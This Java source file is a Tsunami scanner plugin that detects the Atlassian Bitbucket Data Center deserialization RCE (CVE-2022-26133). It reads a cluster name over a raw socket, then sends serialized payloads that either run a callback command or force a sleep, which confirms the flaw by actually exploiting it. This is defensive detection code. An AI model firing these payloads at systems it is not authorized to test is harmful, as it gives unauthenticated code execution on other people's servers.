package com.google.tsunami.plugins.detectors.rce.cve202226133;

import com.google.common.base.Stopwatch;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.common.net.HostAndPort;
import com.google.common.primitives.Bytes;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;

import javax.inject.Inject;
import javax.net.SocketFactory;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Arrays;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

/** A {@link VulnDetector} that detects Atlassian Bitbucket Data Center RCE CVE-2022-26133. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Atlassian Bitbucket Data Center RCE CVE-2022-26133 Detector",
    version = "0.1",
    description = "This detector checks Atlassian Bitbucket Data Center RCE (CVE-2022-26133).",
    author = "yuradoc (yuradoc.research@gmail.com)",
    bootstrapModule = Cve202226133DetectorBootstrapModule.class)
public final class Cve202226133Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;
  private final SocketFactory socketFactory;
  private static final byte[] CLUSTER_NAME_REQUEST_GARBAGE = new byte[] {0x00, 0x00, 0x00, 0x02, 0x73, 0x61};
  private static final String RCE_CMD_PLACEHOLDER = "{{CMD}}";
  private static final short RCE_CMD_WAIT_AFTER_TIMEOUT = 1000;
  private static final short SLEEP_CMD_WAIT_DURATION_SECONDS = 4;
  private byte[] clusterName;
  private byte[] payload;
  @Inject
  Cve202226133Detector(
      @UtcClock Clock utcClock, SocketFactory socketFactory, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.socketFactory = checkNotNull(socketFactory);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202226133Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(Cve202226133Detector::isNimOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private static boolean isNimOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.getServiceName(networkService).equals("nim")
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return (payloadGenerator.isCallbackServerEnabled() && isVulnerableWithCallback(networkService))
        || isVulnerableWithoutCallback(networkService);
  }

  private boolean isVulnerableWithCallback(NetworkService networkService) {
    HostAndPort hp =
        NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());

    Payload cmdPayload;
    try {
      clusterName = retrieveClusterName(hp);
      if (!validateClusterName(clusterName)) {
        return false;
      }

      this.payload =
          Resources.toByteArray(Resources.getResource(this.getClass(), "payloadRuntimeExec.bin"));

      PayloadGeneratorConfig config =
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build();

      cmdPayload = payloadGenerator.generate(config);

      byte[] cmd = cmdPayload.getPayload().getBytes();

      int cmdIndex = Bytes.indexOf(this.payload, RCE_CMD_PLACEHOLDER.getBytes());
      byte[] payloadMessage = Bytes.concat(
          clusterName, Arrays.copyOfRange(this.payload, 0, cmdIndex), cmd,
          Arrays.copyOfRange(this.payload, cmdIndex + cmd.length, this.payload.length));

      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
      socket.getOutputStream().write(payloadMessage);
      Uninterruptibles.sleepUninterruptibly(Duration.ofMillis(RCE_CMD_WAIT_AFTER_TIMEOUT));
      socket.close();
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to communicate with '%s'.", hp.toString());
      return false;
    }

    return cmdPayload.checkIfExecuted();
  }

  private boolean isVulnerableWithoutCallback(NetworkService networkService) {
    HostAndPort hp =
        NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());

    Stopwatch stopwatch = null;
    try {
      if (clusterName == null) {
        clusterName = retrieveClusterName(hp);
        if (!validateClusterName(clusterName)) {
          return false;
        }
      }
      else if (!validateClusterName(clusterName)) return false;

      this.payload =
          Resources.toByteArray(Resources.getResource(this.getClass(), "payloadThreadSleep.bin"));

      byte[] payloadMessage = Bytes.concat(clusterName, this.payload);

      stopwatch = Stopwatch.createStarted();

      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
      socket.getOutputStream().write(payloadMessage);
      socket.getInputStream().readAllBytes();
      socket.close();
    } catch (IOException e) {}

    stopwatch.stop();

    return stopwatch.elapsed().getSeconds() >= SLEEP_CMD_WAIT_DURATION_SECONDS;
  }

  private byte[] retrieveClusterName(HostAndPort hp) throws IOException {
    Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
    InputStream in = socket.getInputStream();
    socket.getOutputStream().write(CLUSTER_NAME_REQUEST_GARBAGE);
    byte[] clusterName = in.readAllBytes();
    socket.close();
    return clusterName;
  }

  private boolean validateClusterName(byte[] clusterName) {
    return !(clusterName.length == 0 || Arrays.equals(clusterName, new byte[clusterName.length]));
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-26133"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Atlassian Bitbucket DC RCE (CVE-2022-26133)")
                .setDescription(
                    "SharedSecretClusterAuthenticator in Atlassian Bitbucket Data Center versions"
                        + " 5.14.0 and later before 7.6.14, 7.7.0 and later prior to 7.17.6,"
                        + " 7.18.0 and later prior to 7.18.4, 7.19.0 and later prior"
                        + " to 7.19.4, and 7.20.0 allow a remote, unauthenticated attacker to "
                        + "execute arbitrary code via Java deserialization."))
        .build();
  }
}
